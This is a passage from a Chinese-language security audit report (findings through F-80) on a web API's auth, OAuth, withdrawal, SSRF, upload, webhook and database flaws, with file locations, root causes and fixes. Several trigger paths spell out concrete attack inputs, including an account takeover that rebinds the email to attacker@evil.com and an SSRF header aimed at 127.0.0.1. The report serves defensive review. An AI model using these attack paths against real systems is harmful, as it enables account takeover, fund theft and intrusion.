- **文件与行号**：`apps/api/src/services/terminal-service.ts:998-1028`；路由 `apps/api/src/routes/terminal.ts:138-146`
- **触发路径**：任意登录用户 `GET /api/terminal/sessions/history`。
- **根因**：`redis.scan(cursor, 'MATCH', 'terminal:session:*', 'COUNT', 100)` 遍历**全用户** key，随后对每个 key 顺序 `hgetall` + `llen`，结果一次性返回、无分页/条数上限，最后才按 userId 过滤。
- **证据**：
  - `:1005`：`const [next, keys] = await redis.scan(cursor, 'MATCH', 'terminal:session:*', 'COUNT', 100)`
  - `:1008`：`const meta = await redis.hgetall(key)`
  - `:1011`：`const scrollbackLines = await redis.llen(scrollbackKey(sessionId))`
- **影响面**：延迟随全站会话总数线性增长（串行 RTT），响应体无上限；任意登录用户可反复调用放大 Redis 压力。
- **建议修法**：写入时维护 `terminal:user:{userId}:sessions` 集合，读侧按集合分页；`llen` 用 pipeline 批量。
- **是否当场可修**：是。

## 八、第四轮新增（鉴权与授权 / 资金 / 输入 / DB / v1-worker）

> 说明：第四轮按五个互不重叠的面向并行深扫，以下每条均已回读 `origin/main` 源码核实关键行（部分为行号级复核）。去重已检索 `PROJECT_PLAN.md` 与 `scripts/data/plan-fields.jsonl`。

### 第四轮 A：鉴权与授权

### F-53 `/auth/profile` 仅凭会话即可改绑邮箱，账号可被持久接管

- **严重度**：P0
- **文件与行号**：`apps/api/src/routes/auth-extended.ts:1134-1202`（`:1143` 接受 `email`，`:1199-1202` 直接 `updateUser`）
- **触发路径**：任意有效会话（含被盗短期 token）→ `PUT /api/auth/profile {"email":"attacker@evil.com"}` → 邮箱改绑成功 → 攻击者走 `/api/auth/email/code` + 邮箱验证码登录接管。
- **根因**：该端点仅 `authenticate`，`email` 字段直接写库；不校验 `currentPassword`、不查邮箱占用、不吊销 refresh token。同仓 `/api/auth/me` 已对同一攻击链做过 P0 修复（`auth.ts:1598-1645`：改绑需当前密码 + `revokeAllUserRefreshTokens`），此并行端点漏改。
- **证据**：
  - `auth-extended.ts:1143`：`email: z.email().optional(),`
  - `auth-extended.ts:1199-1202`：`await updateUser(request.userId!, { ...(email !== undefined ? { email } : {}) })`
  - 对照 `auth.ts:1642-1645`：`if (rebinding) { if (!currentPassword || ...) return reply.status(403)... }`
- **影响面**：所有已登录用户；临时会话即可完成邮箱归属变更，随后验证码登录长期接管。
- **建议修法**：`/auth/profile` 移除 `email`，或复用 `/auth/me` 的密码校验 + 唯一性 + 吊销 refresh token + 安全事件；最小改动为 `email !== user.email` 时返回 403 引导走 `/auth/me`。
- **是否当场可修**：是。

### F-54 Coze 聊天历史接口无归属校验，可读他人会话全文

- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/user/member-routes.ts:24-33`；`apps/api/src/db/coze-chat-queries.ts:12-35`
- **触发路径**：任意登录用户 `GET /api/coze/chat/history/:botId/:conversationId`，无需是该会话创建者。
- **根因**：路由只挂用户级 preHandler，handler 完全不使用 `request.userId`；查询 where 仅 `botId + conversationId`，模型无 user 列。
- **证据**：
  - `member-routes.ts:29`：`const result = await findCozeChatHistory(botId, conversationId, q.page, q.pageSize)`
  - 查询：`and(eq(cozeChatHistory.botId, botId), eq(cozeChatHistory.conversationId, conversationId))`
- **影响面**：跨用户聊天正文泄露（`conversationId` 会下发前端/日志/分享链接）。
- **建议修法**：表补/映射 `user_id`，查询强制 `AND user_id = request.userId`；迁移前先下线该端点。
- **是否当场可修**：是（查询加谓词）。

### F-55 OAuth 签名密钥管理端点仅要求登录，任意用户可轮转/吊销平台密钥

- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/oauth-keys.ts:103-201`（`:105` 仅 `authenticate`）
- **触发路径**：任意普通用户 `POST /api/oauth-keys/revoke {"keyId":"<当前 active key>"}`、`/rotate`、`/generate`。
- **根因**：插件唯一守卫是 `server.addHook('preHandler', authenticate)`，无 `requireAdmin`/权限点；`/revoke` 对 keyId 无用途限制。
- **证据**：
  - `oauth-keys.ts:104-105`：`// 所有端点需要认证` / `server.addHook('preHandler', authenticate)`
  - `/revoke`：`.update(oauthPrivateKeys).set({ isActive: 0 }).where(eq(oauthPrivateKeys.id, keyId))`
- **影响面**：OIDC 当前签名密钥可被低权限用户吊销，ID Token/JWKS 失效；可反复 rotate 制造密钥抖动。
- **建议修法**：整插件改 `requireAdmin` 或 `oauth:keys:manage`；禁止吊销唯一 active 密钥；补审计。
- **是否当场可修**：是。

### F-56 `/oauth/authorize` 与 `/oauth/userinfo` 未校验 token 黑名单，登出后仍可换新令牌

- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/oauth-authorization-server.ts:294-334`、`:390-397`；对照 `apps/api/src/plugins/auth.ts:233-240`
- **触发路径**：窃取 access token → 受害者登出（token 入黑名单）→ 攻击者仍用该 token 请求 `/oauth/authorize?...` → 得新 code → `/oauth/token` 换新 access+refresh。
- **根因**：这两处只用 `introspectAccessToken`（纯签名/过期），未叠加 `isTokenBlacklisted`；`authenticate` 已实现吊销检查，说明是遗漏。
- **证据**：
  - `oauth-authorization-server.ts:297-299`：`const info = await introspectAccessToken(...); userId = info.active ? (info.sub ?? null) : null`
  - 本次 grep 该文件 `isTokenBlacklisted|blacklist` → **无匹配**
  - 对照 `plugins/auth.ts:233-240`：`if (blacklist && (await blacklist.has(token))) { ... }`
- **影响面**：登出/吊销在 OAuth 根路径失效，token 剩余有效期可复活为全新令牌。
- **建议修法**：抽 `authenticateOAuthBearer()` 统一叠加黑名单 + 用户状态；两处改用该出口。
- **是否当场可修**：是。

### F-57 授权码/刷新令牌未与客户端绑定（3 个兼容换取端点 + refresh 分支）

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/auth-extended.ts:2373-2392`、`:2632-2651`、`:2673-2692`、`:2708-2713`；`apps/api/src/routes/oauth-tokens.ts:414-464`
- **触发路径**：攻击者注册自有 OAuth 客户端（匿名 DCR）→ 取得属于其他客户端的授权码/refresh token → 用自己的 `client_id/secret` 兑换。
- **根因**：这些分支 `findSessionByCode` 后只判 `isUsed/expiresAt`，无 `session.clientId !== client_id`；同文件 `:2487-2488` 已正确做该绑定检查。
- **证据**：
  - `auth-extended.ts:2487-2488`（正确）：`if (session.clientId !== parsed.data.client_id) return reply.status(400)...`
  - `/oauth/token/exchange` refresh 分支直接 `rotateRefreshTokenFlow(refresh_token)`，未调用 `authenticateOAuthClient`
- **影响面**：未强制 PKCE 的 legacy confidential 客户端授权码可被任意 DCR 客户端兑换；refresh token 可跨客户端续期。
- **建议修法**：三处补 clientId 绑定；refresh 分支要求客户端认证并校验归属。
- **是否当场可修**：是。

### F-58 `/members/register/mobile` 要求验证码却完全不校验，公开注册可绕过短信验证

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/member.ts:144-149`（schema）、`:532-550`（handler）；公开端点（鉴权插件在 `:553` 之后）
- **触发路径**：未登录 `POST /api/members/register/mobile {"mobile":"任意手机号","password":"123456","code":"x"}`。
- **根因**：schema 声明 `code: z.string().min(1)`，但 handler 只把 `mobile/password/nickname` 传给 `registerMemberByMobile`，既未 `verifyCode` 也未传 code。
- **证据**：
  - `member.ts:538-542`：`registerMemberByMobile({ mobile, password, nickname })`
- **影响面**：短信验证形同虚设；可批量注册并抢占他人手机号（合法用户 409）。
- **建议修法**：注册前执行与 `/auth/sms/register` 相同的 `verifyCode`（一次性 + 失败计数）。
- **是否当场可修**：是。

### F-59 任意登录用户可创建 enterprise 租户；租户 admin 可降级/移除 owner

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/tenant.ts:17-22`、`:108-140`；`:256-287`（成员角色/移除）
- **触发路径 A**：`POST /api/tenants {"name":"x","slug":"x","plan":"enterprise"}` → 按 enterprise 初始化配额。
- **触发路径 B**：租户 admin → `PATCH /api/tenants/:id/members/<ownerUserId> {"role":"member"}` 或 `DELETE .../members/<ownerUserId>`。
- **根因**：`createTenantSchema` 把计费 `plan` 暴露给调用者并按它初始化配额；成员更新只校验操作者 ≥ admin，不限制目标角色、无“最后一个 owner”保护。
- **证据**：
  - `tenant.ts:114`：`const { name, slug, description, plan } = parsed.data`
  - `tenant.ts:134-136`：`plan === 'enterprise' ? { apiCallsLimit: 10_000_000, ... }`
- **影响面**：自助提升配额；租户 owner 被 admin 剥夺，租户进入无人可删的僵死态。
- **建议修法**：创建/更新忽略客户端 `plan`（仅平台管理员/支付回调可改）；禁止降级/移除 owner，禁止移除最后一个 owner。
- **是否当场可修**：是。

### F-60 未认证 `/api/security/report` 可指定任意 IP 写坏事件，影响自动封禁

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/security.ts:63-68`（`ip` 可选）、`:176-189`；`apps/api/src/services/ip-reputation.ts:218-225`
- **触发路径**：未登录 `POST /api/security/report {"type":"x","description":"x","ip":"<目标 IP>"}`，5 次/分钟。
- **根因**：公开上报把“被上报 IP”交给客户端指定，并直接 `recordBadEvent` 进入自动封禁评分；无来源真实性约束。
- **证据**：
  - `security.ts:188-189`：`const reportIp = parsed.data.ip ?? ip` / `await ipRep.recordBadEvent(reportIp, ...)`
- **影响面**：对数据中心/代理/恶意 ASN 段可定向推过封禁阈值（可用性 DoS），并污染风控。
- **建议修法**：忽略客户端 `ip`，只用 `request.ip`；类型白名单并降低权重。
- **是否当场可修**：是。

### 第四轮 B：资金与积分

### F-61 分销提现申请只插流水、不冻结不扣款，成功回调把 frozen 扣成负数、失败回调凭空铸币

- **严重度**：P0
- **文件与行号**：`apps/api/src/routes/distribution.ts:428-445`；`apps/api/src/routes/payment-extended.ts:151-198`
- **触发路径**：登录用户 `POST /api/distribution/withdraw` → 管理员通过 → 微信转账回调 `SUCCESS`/`FAIL`。
- **根因**：该端点只读一次 `availableWithdrawal` 后直插 `withdrawal_flows`，未调用 `applyWithdrawal`（无 `token -= / frozen +=`、无事务/锁、无 `partnerTradeNo`、`fee:0`）；回调按“申请时已冻结”语义只做 `frozen -= amount`（SUCCESS）或 `token += / frozen -=`（FAIL）。
- **证据**：
  - `distribution.ts:434-445`：`db.insert(withdrawalFlows).values({ amount: body.data.amount, fee: 0, status: 0 })`
  - `payment-extended.ts:165-172`：`frozenQuantity: sql\`frozen_quantity - ${flow.amount}\``
  - `payment-extended.ts:188-196`：`tokenQuantity: sql\`token_quantity + ${flow.amount}\``
- **影响面**：SUCCESS 后用户保留全部 token 又拿到现金且 frozen 变负；FAIL 直接铸币；申请期间余额未锁定，并发可超额挂单；绕过 2% 手续费。
- **建议修法**：删除该实现，统一走 `applyWithdrawal`；可用额校验放入同一事务/锁；补幂等键。
- **是否当场可修**：是。

### F-62 管理端提现审核驳回不退款且无状态守卫，已驳回/已完成流水可被改回 processing 再次打款

- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/finance.ts:327-352`；对照 `apps/api/src/db/commission-queries.ts:619-641`
- **触发路径**：`PUT /api/admin/finance/withdrawal/:id/audit {"status":"rejected"}`；或对已 `completed(2)`/已退款 `(3)` 的流水再次提交 `approved`。
- **根因**：无条件按 id UPDATE 状态；rejected 仅写 `status:3`，不退还 `frozenQuantity`/`tokenQuantity`；WHERE 无 `status=0`。项目已有正确的 `rejectWithdrawal`（条件 `status=0` + 同事务退款）。
- **证据**：
  - `finance.ts:346-350`：`.update(withdrawalFlows).set(set).where(eq(withdrawalFlows.id, parsedParams.data.id))`
  - 对照 `commission-queries.ts:629-641`：`.where(and(eq(id), eq(status, 0)))` + `tokenQuantity + amount / frozenQuantity - amount`
- **影响面**：正常冻结的提现被驳回后 token 永久卡在 frozen；`3→1` 可绕过 `payment-extended` 的 `status !== 0 && !== 1` 守卫再次打款（退款后又收一次钱）；并发通过/驳回均成功。
- **建议修法**：改用 `approveWithdrawal/rejectWithdrawal`；`WHERE status=0` + RETURNING 判空 + 同事务退款；禁止 `2/3→1`。
- **是否当场可修**：是。

### F-63 `/wallet/withdraw` 跳过可提现资格校验，充值/赠送 token 可直接提现；申请环节仍有 TOCTOU

- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/wallet.ts:132-157`；`apps/api/src/routes/user/withdrawal-routes.ts:84-96`；`apps/api/src/db/commission-queries.ts:471-505`
- **触发路径**：`POST /api/wallet/withdraw {amount, account, accountType}` 或 `POST /api/finance/withdrawal/withdrawal`。
- **根因**：另有一条 `availableWithdrawal`（仅统计 `commission_flows.status=1`），但 `wallet.ts` 不调用它，直接 `applyWithdrawal` 扣 `user_margins.token_quantity`（充值/赠送/佣金都入此账）；`withdrawal-routes` 的“读 available → 写提现”跨两次往返、无锁。
- **证据**：
  - `wallet.ts:148-156`：直接 `applyWithdrawal({ userId, amount, method, accountInfo })`，无 `availableWithdrawal`
  - `withdrawal-routes.ts:84-96`：先 `availableWithdrawal` 再 `applyWithdrawal`，无 `FOR UPDATE`
- **影响面**：只要 `token_quantity` 有值即可按 98% 提现，绕开“仅佣金可提现”边界；并发可挂出 2 倍 pending。
- **建议修法**：统一提现服务：同事务 `SELECT … FOR UPDATE` 计算佣金可用额；两入口合并；加幂等键。
- **是否当场可修**：是（需业务口径确认）。

### F-64 `/finance/margin/refund` 给操作者自己加币，且与原充值共用 `(related_order_no, op_type=0)` 幂等键，退款被静默吞掉

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/finance.ts:123-138`；`apps/api/src/db/commission-queries.ts:141-160`
- **触发路径**：管理员 `POST /api/finance/margin/refund?quantity=…&orderNo=<原充值单号>`。
- **根因**：`refundToken` 内部直接 `return rechargeToken(...)`，`opType=0`，且无目标用户参数，余额加到 `request.userId`（管理员）；与充值共用唯一键，重复时 `23505` 被吞并返回成功。
- **证据**：
  - `commission-queries.ts:151-152`：`return rechargeToken(userId, quantity, orderNo, ...)`
  - `finance.ts:131-137`：`const balance = await refundToken(userId, quantity, idemKey, remark)`
- **影响面**：退款给自己加币；原付款用户 token 未扣回；接口返回成功但实际未发生；负数量可无守卫扣成负余额。
- **建议修法**：改 `refundTokenDeduct(targetUserId, …)`，校验订单归属/金额；退款用独立 `opType`；拒绝负数量。
- **是否当场可修**：是。

### F-65 `/finance/margin/*` 数量无正数/整数校验，负数可反向铸币；目标账户写死为调用者

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/finance.ts:58-139`；`apps/api/src/db/commission-queries.ts:78-139`
- **触发路径**：管理员 `POST /api/finance/margin/deduct?quantity=-1000000`；`/commission?quantity=…&invitedUserId=别人`；`/recharge?quantity=1e9&outTradeNo=<0.01 元已支付单>`。
- **根因**：`quantity: z.coerce.number()` 缺 `.int().positive()`；`deductToken` 条件 `token_quantity >= quantity` 对负数恒真且 `-(-N)` 等于加钱；`invitedUserId` 被 `void`；`recharge` 未校验 `quantity <= order.amount`。
- **证据**：
  - `finance.ts:62`：`{ quantity: z.coerce.number(), remark: ... }`
  - `commission-queries.ts:89-92`：`.set({ tokenQuantity: sql\`token_quantity - ${quantity}\` }).where(sql\`token_quantity >= ${quantity}\`)`
- **影响面**：负数量等价无上限加币/无守卫扣款；佣金发给管理员；小额订单充任意 token；叠加 F-63 可提现。
- **建议修法**：全部 `.int().positive().max(...)`；增加目标 userId + 管理员/归属校验；`recharge` 按 `order.amount` 限幅；使用 `invitedUserId` 或删除。
- **是否当场可修**：是。

### F-66 管理端批量取消订单：读副本判态 + 无条件 UPDATE + 两表写入非事务，可取消已支付订单

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/order.ts:1071-1105`
- **触发路径**：管理员 `POST /api/admin/orders/batch-cancel {ids:[...]}`，同时用户正在支付同一订单。
- **根因**：先用 `dbRead`（读副本）筛 `pending`，随后 `UPDATE … WHERE id IN (cancellableIds)` 不带 `status='pending'`；`edu_orders` 与统一 `orders` 两次 UPDATE 不在事务内。
- **证据**：
  - `order.ts:1071`：`const fetched = await dbRead.select(...)`
  - `order.ts:1095-1099`：`.update(eduOrders).set({ status:'cancelled' }).where(inArray(eduOrders.id, cancellableIds))`
  - `order.ts:1101-1105`：第二次 `ordersTable` UPDATE 无事务包裹
- **影响面**：支付回调置 `paid` 后仍可能被覆盖为 `cancelled`（付钱无退款）；第二次失败产生半截态。
- **建议修法**：主库单条 `UPDATE … WHERE id IN (…) AND status='pending' RETURNING id`；两表包事务；以 RETURNING 为准。
- **是否当场可修**：是。

### F-67 提现 `apply` 的“锁降级”把任何非 400 异常当成锁不可用再执行一次，锁释放失败即重复提现

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/finance.ts:278-291`；`apps/api/src/utils/distributed-lock.ts:187-199`
- **触发路径**：`POST /api/finance/withdrawal/apply`，`applyWithdrawal` 已提交后 `lock.release()` 抛 Redis 错误（或其他无 `statusCode` 异常）。
- **根因**：`withLock` 的 `finally { await lock.release() }` 会把释放异常抛给调用方；路由 catch 只按 `statusCode` 区分，凡无 `statusCode` 都走“降级执行”分支再跑一次 `doApply()`；`applyWithdrawal` 内部生成 `partnerTradeNo`，客户端无幂等键。
- **证据**：
  - `finance.ts:284-290`：`catch (e) { if ((e as ...).statusCode) throw e; ... const flow = await doApply() }`
  - `distributed-lock.ts:195-199`：`try { return await fn() } finally { await lock.release() }`
- **影响面**：首次已扣款/冻结成功，仅因释放锁失败再插一笔提现并再冻结 → 两条待打款流水。
- **建议修法**：区分“acquire 失败”与“业务异常”；`fn` 异常原样抛出；要求客户端 `requestId` + 唯一索引，重放返回首次结果。
- **是否当场可修**：是。

### F-68 直播礼物扣的是孤儿表 `user_token_balance`，与钱包 `user_margins/token_flows` 双账本

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/live-gifts.ts:279-298`；`apps/api/src/routes/wallet.ts:86-99`；`apps/api/src/routes/agents.ts:2395-2427`
- **触发路径**：`POST /api/live-gifts/:id/send`（余额来自 `user_token_balance`）对比 `GET /api/wallet/balance`（来自 `user_margins`）。
- **根因**：钱包/充值/佣金/提现统一走 `user_margins.token_quantity`，礼物校验与扣款走 `user_token_balance`；该表除管理员绝对 UPDATE 外无入账写入点，且不写 `token_flows`。
- **证据**：
  - `live-gifts.ts:281`：`SELECT balance FROM user_token_balance WHERE user_uuid = ${userId}`
  - `wallet.ts:86-99`：`balance: margin.tokenQuantity`
  - `agents.ts:2426`：`UPDATE user_token_balance SET balance = COALESCE(...)`
- **影响面**：正常充值用户礼物余额为 0（无法打赏）；管理员写入的礼物余额不进流水、不参与对账；礼物扣款无流水。
- **建议修法**：统一到 `user_margins.token_quantity`，礼物扣款复用 `deductToken(tx, …)`；如需兼容层须同事务双写 + 对账。
- **是否当场可修**：否（需账本迁移/双写方案）。

### 第四轮 C：输入面（SSRF / 上传 / Webhook / 反序列化）

### F-69 OSS 直传回调免鉴权 + 公钥 URL 子串白名单绕过，形成内网盲 SSRF 且验签可绕过

- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/oss.ts:132-136`、`:388-408`；`apps/api/src/services/storage-service.ts:480-511`
- **触发路径**：`POST /api/oss/callback`，头 `x-oss-pub-key-url: base64(http://127.0.0.1:PORT/任意?x=.alicdn.com/)`，`authorization` 任意 base64。
- **根因**：公钥地址完全由请求头控制；白名单用 `startsWith` + `.alicdn.com/` 子串正则，攻击者把该子串放进 path/query 即通过；未解析协议/主机、无内网 IP 校验、未走 `safeFetch`。
- **证据**：
  - `oss.ts:134`：`if (request.url.startsWith('/oss/callback')) return`
  - `storage-service.ts:491-495`：`allowedDomains.some(...) || /\.alicdn\.com\//.test(pubKeyUrl) || /\.aliyuncs\.com\//.test(pubKeyUrl)`
  - `storage-service.ts:501-508`：`const resp = await fetch(pubKeyUrl); const pem = await resp.text(); createPublicKey(pem)`
- **影响面**：API 主机成为内网盲 SSRF 跳板；可托管自有 PEM 使验签恒真；`resp.text()` 无大小上限 + `pubKeyCache` 无容量上限 → 内存 DoS。
- **建议修法**：`new URL()` 校验 `https` + 主机标签边界精确匹配；改用 `safeFetch`；限制响应大小/超时/缓存容量；公钥内置或服务端固定。
- **是否当场可修**：是。

### F-70 OSS STS 直传凭证策略过宽：整桶 `*` + 无大小条件，"仅本人目录/50MB" 均失效

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/oss-sts-service.ts:133-150`、`:257-263`；`apps/api/src/routes/oss.ts:169`
- **触发路径**：登录后 `POST /api/oss/sts` 取临时凭证 → 直接向 bucket PUT 任意 objectKey、任意大小。
- **根因**：会话策略 `resource` 为整桶 `bucket/*`，无 `content-length-range`；`objectKey` 仅“推荐值”，服务端不强制；`/oss/upload` 的 50MB 只校验 JSON 声明的 `size`。
- **证据**：
  - 腾讯策略：`resource: [\`qcs::cos:${region}:::${bucket}/*\`]`
  - 阿里策略：`Resource: [\`acs:oss:*:*:${config.bucket}/*\`]`（无 `Condition`）
  - `oss.ts:169`：`preHandler: [createUploadPreHandler({ maxSize: 50 * 1024 * 1024 })]` + 注释“实际写入由 files.ts 完成”
- **影响面**：任意登录用户绕开 50MB 限制上传任意大对象；可写桶内任意 key（覆盖他人对象）；AWS 分支无 `Policy` 继承角色默认权限。
- **建议修法**：`resource` 收敛为 `uploads/{userId}/*` 并加 `content-length-range`；AWS 补 `Policy`；忽略客户端 `sessionName`。
- **是否当场可修**：是。

### F-71 `/api/callback-log` 全局无隔离，任意登录用户可读/删全站回调日志（含请求体）

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/callback-log.ts:44`、`:114-132`、`:166-215`
- **触发路径**：登录后 `GET /api/callback-log/list`、`GET /api/callback-log/:id`、`DELETE /api/callback-log/:id`。
- **根因**：日志存进程内全局 `Map`，条目无 `userId` 维度；读/删端点只 `checkAuth`，无归属过滤与管理员档位。
- **证据**：
  - `callback-log.ts:44`：`const store = new Map<string, CallbackLogEntry>()`
  - `callback-log.ts:114-132`：`let list = Array.from(store.values())`
- **影响面**：跨租户读取支付/短信/外呼回调请求体（手机号、订单号、第三方报文）；可删除他人回调证据；Map 无上限。
- **建议修法**：落库并带 `ownerUuid`，读/删按 `request.userId` 过滤；写端点改内部服务票/签名；加容量上限。
- **是否当场可修**：是。

### F-72 `/api/webhooks/trigger/:id` 只验 HMAC，无时间戳/nonce/去重，签名报文可无限重放触发 agent

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/webhooks-trigger.ts:328-345`、`:397-437`
- **触发路径**：抓到任意一次合法投递（正文 + `X-Webhook-Signature`）后原样重放；每次命中都 `void executeAgentAsync(event)`。
- **根因**：签名只覆盖 body，不覆盖时间戳/nonce；无 `X-Webhook-Timestamp` 校验、无 eventId 幂等；`eventStore` 只做内存淘汰。
- **证据**：
  - `webhooks-trigger.ts`：`verifySignature(rawPayload, signatureHeader, config.secret)` / `void executeAgentAsync(event)`
- **影响面**：公开前缀上的资源放大：一次抓包即可持续触发付费模型调用与写操作。
- **建议修法**：签名串纳入 `t + nonce`，校验 ±5min 并按 nonce/eventId 做 Redis 幂等；按触发器限流。
- **是否当场可修**：是。

### F-73 出站 webhook 存了 `secret` 却从不签名，接收方无法验证来源

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/webhooks.ts:36-40`、`:46-51`、`:154`；对照正确实现 `apps/api/src/routes/developer/webhooks.ts:151-162`
- **触发路径**：创建 webhook（带 `secret`）→ `POST /api/developer/webhooks/:id/test` 或 `/retry`。
- **根因**：`deliverWebhook(url, body, _secret)` 第三参数从未使用，未计算 HMAC、未写签名头；创建响应却返回 secret。
- **证据**：
  - `webhooks.ts`：`async function deliverWebhook(url, body, _secret?)` → `headers: { 'Content-Type': 'application/json' }`
  - 对照 `developer/webhooks.ts:151-162`：`createHmac('sha256', secret).update(body).digest('hex')` + `X-IHUI-Signature`
- **影响面**：接收端要么不验签（任何第三方可伪造平台投递），要么无法对接；同平台两套 webhook 鉴权强度不一致。
- **建议修法**：按开发者 webhook 同出口计算 HMAC-SHA256 并加时间戳；响应体读取加上限。
- **是否当场可修**：是。

### F-74 CLI 导入 preview 未绑定 userId，凭 previewId 可把他人 API Key 导入自己账户

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/cli-import.ts:369-423`；`apps/api/src/services/cli-import/redis-cache.ts:79-111`
- **触发路径**：受害者 `POST /api/user/cli-import/parse-payload` 得 `previewId`（10 分钟）→ 攻击者 `POST /api/user/cli-import/commit`（`selectedProviderIds: []` 全量）→ 用受害者明文 apiKey 加密落库到攻击者。
- **根因**：缓存 key 仅 `cli-import:preview:<previewId>`，无 owner 标签；`savePreview` 存含明文 apiKey 的完整对象；commit 只校验“已登录”。
- **证据**：
  - `redis-cache.ts:80`：`const key = \`${KEY_PREFIX}${preview.previewId}\``
  - `redis-cache.ts:14`：注释 `key 前缀 cli-import:preview:<uuid>`
- **影响面**：跨账号凭据窃取（受害者上游 LLM/中转 Key 写入攻击者配置后可直接使用）。
- **建议修法**：key 改 `cli-import:preview:<userId>:<previewId>` 或 value 内附 `ownerUuid` 并强校验；preview 结果脱敏缓存。
- **是否当场可修**：是。

### F-75 `xss-protection` 请求体净化挂在 `onRequest`，body 未解析 ⇒ 净化从不生效

- **严重度**：P3
- **文件与行号**：`apps/api/src/plugins/xss-protection.ts:90-104`
- **触发路径**：任意 `text/html` / 表单 / multipart 请求带 XSS 载荷提交到会回显/落库的端点。
- **根因**：Fastify `onRequest` 阶段 `request.body` 恒为 `undefined`，`if (request.body !== null && !== undefined)` 永不成立；同仓 `prompt-injection-guard.ts` 已记载该生命周期问题并改用 preHandler，本插件未同步。
- **证据**：
  - `xss-protection.ts`：`server.addHook('onRequest', ...)` + `if (request.body !== null && request.body !== undefined) { request.body = sanitizeValue(...) }`
- **影响面**：插件宣称的请求体净化实际为零，仅 `X-XSS-Protection` 头生效。
- **建议修法**：改挂 `preValidation`/`preHandler`；multipart 在 preHandler 处理。
- **是否当场可修**：是。

### F-76 `/api/pdf-service/merge` fileIds 无上限 + `readFileSync` 全量同步读，单请求可 OOM/阻塞事件循环

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/other/pdf-routes.ts:37-39`、`:61-74`、`:158-181`
- **触发路径**：登录用户上传 2 个 PDF 得 fileId → `POST /api/pdf-service/merge`，`fileIds` 填 4 万次相同 UUID（JSON ~1.5MB，低于 bodyLimit）→ 循环 `readFileSync` + `PDFDocument.load` + `copyPages`。
- **根因**：`z.array(z.uuid()).min(2)` 无 `.max()`；每个 id 同步读整文件；结果写静态目录无配额/清理。
- **证据**：
  - `pdf-routes.ts:37`：`fileIds: z.array(z.uuid()).min(2, '至少需要 2 个文件')`
  - `pdf-routes.ts`：`return readFileSync(resolved)`；循环 `await PDFDocument.load(readStoredPdf(id))`
- **影响面**：单请求打爆进程内存/事件循环；重复调用填满公开静态目录。
- **建议修法**：`.max(20)` + 配额；改 `fs/promises` 异步/流式；结果目录配额与清理。
- **是否当场可修**：是。

### 第四轮 D：数据库查询层

### F-77 部门用户列表把 TOTP 密文与 2FA 备份码哈希整行返回给管理端

- **严重度**：P2
- **文件与行号**：`apps/api/src/db/member-queries.ts:718-721`；`apps/api/src/routes/member.ts:1412-1426`
- **触发路径**：`GET /api/admin/members/departments/:id/users` → `findUsersByDepartment`（`member.ts:1423`）→ 返回体 `list` 直接展开。
- **根因**：查询层 `select()` 全列返回 `twoFactorSecret`（AES 密文）与 `twoFactorBackupCodes`（sha256 哈希数组）；路由层黑名单只剥离 `passwordHash`，响应 schema `additionalProperties: true` 不裁剪。
- **证据**：
  - `member-queries.ts:718-720`：`twoFactorSecret: users.twoFactorSecret, twoFactorEnabled: ..., twoFactorBackupCodes: users.twoFactorBackupCodes,`
  - `member.ts:1425`：`result.list.map(({ passwordHash: _pw, ...rest }) => rest)`
- **影响面**：任一 ADMIN 可批量导出全站 TOTP 密文与备份码哈希；密钥泄漏即可解出 TOTP，备份码低熵可离线爆破 → 2FA 绕过面扩大。
- **建议修法**：显式白名单投影；或路由同时剔除上述三列。
- **是否当场可修**：是。

### F-78 会员企业列表分页/总数/筛选三处错位

- **严重度**：P2
- **文件与行号**：`apps/api/src/db/member-queries.ts:352-391`
- **触发路径**：`GET /api/admin/members/companies`（`member.ts:655-660`）。
- **根因**：`limit/offset` 作用在会员行而非企业；`total: companies.size` 只是当前页聚合数；`opts.name` 过滤 `eduMembers.nickname` 而非企业名。
- **证据**：
  - `member-queries.ts`：`.from(eduMembers).where(where).orderBy(desc(eduMembers.id)).limit(opts.pageSize).offset(...)`
  - 返回：`total: companies.size`
- **影响面**：企业重复/缺失、翻页器永远偏小、按企业名搜索无效。
- **建议修法**：以 `eduCompanies` 为主表做企业级分页，再 `inArray` 拉本页成员；`total` 用 `count(distinct company_id)`。
- **是否当场可修**：是（需重写查询）。

### F-79 工作区批量删除/恢复逐文件串行校验，单请求最多 200 次 DB 往返（N+1）

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/workspace.ts:484-493`、`:516-525`；入参上限 `:93-95`
- **触发路径**：`POST /api/workspace/files/batch-delete` / `batch-restore`（`fileIds.max(100)`）。
- **根因**：归属校验在 for 循环内每个 id 依次 `findFileById` + `findProjectById`，100 文件最多 200 次串行查询。
- **证据**：
  - `workspace.ts:484-493`：`for (const fid of parsed.data.fileIds) { const file = await findFileById(fid); ... const project = await findProjectById(file.projectId) }`
- **影响面**：P99 随批量线性放大，可打满连接池；校验与写入分离存在 TOCTOU。
- **建议修法**：一条 join 聚合查询拿回缺失/越权 id；写侧 `batchSoftDelete(...).returning()`。
- **是否当场可修**：是。

### F-80 智能体点赞/收藏计数可并发重复累加，且增删非事务导致永久漂移

- **严重度**：P2
- **文件与行号**：`apps/api/src/db/agents-queries.ts:555-622`；`apps/api/src/routes/agents.ts:1737-1764`；`packages/database/src/schema/agents-extended.ts:274-298`
- **触发路径**：`POST /api/agents/thumbs`、`POST /api/agents/collect`。
- **根因**：check-then-act 无事务、无唯一约束；`addThumb` 为 INSERT + UPDATE 两条独立语句；`removeThumb` 删除全部同键行却只 `-1`。
- **证据**：
